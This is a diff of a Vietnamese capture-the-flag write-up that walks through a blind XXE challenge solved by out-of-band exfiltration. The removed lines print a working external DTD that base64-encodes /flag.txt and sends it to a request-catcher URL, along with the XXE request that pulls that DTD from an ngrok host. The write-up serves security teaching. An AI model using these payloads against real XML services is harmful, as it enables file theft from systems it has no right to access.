@@ -177,24 +177,14 @@ Sau một hồi test, thì mình thấy phải sử dụng `XXE OOB with DTD and
 
 - Trong kỹ thuật này mình cần tạo một server có chức năng truyền file khi một request yêu cầu (mình sẽ tận dụng kali linux + ngrok) và cần một nơi để bắt được request đến (mình sẽ sử dụng [requestcatcher.com](https://duypt.requestcatcher.com/)):
 + Đầu tiên mình sẽ tạo một file XML trong server của mình đặt tên là `dtd.xml`, với nội dụng như sau:
-`
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://duypt.requestcatcher.com/dtd.xml?%data;'>">
-`
+
+![image](https://user-images.githubusercontent.com/86275419/212874834-2504f37a-74a9-4964-afd3-38c3974f3229.png)
 
 --> Script này thực hiện việc gửi dữ liệu trong file `/flag.txt` tới `https://duypt.requestcatcher.com/`
 
 + Chuyển sang Burp Suite để request đến trang Web của BTC, mình sẽ request với nội dung như sau:
-`
-<?xml version="1.0" ?>
-<!DOCTYPE r [
-<!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "https://6826-113-167-248-183.ap.ngrok.io/dtd.xml">
-%sp;
-%param1;
-]>
-<r>&exfil;</r>
-`
+
+![image](https://user-images.githubusercontent.com/86275419/212874927-8bba1ef5-7854-4a71-9c38-0e759b35ecf6.png)
 
 --> Script này sẽ thực hiện việc truy vấn đến server mà ta đã dựng sẵn để lấy file `dtd.xml` chứa các entities mà ta đã định nghĩa sẵn, sau đó sẽ gọi và thực thi các entities đó
 
@@ -207,7 +197,7 @@ Kết quả tại `https://duypt.requestcatcher.com/`:
 Sau dấu `?` của URL chính là flag đang được encode
 Decode base 64 ta sẽ được Flag: `KCSC{blind_xxD_xxO_xx]_xxe!!@#@}`
 
------Continue
+-----End Web. Continue...
 
 
 
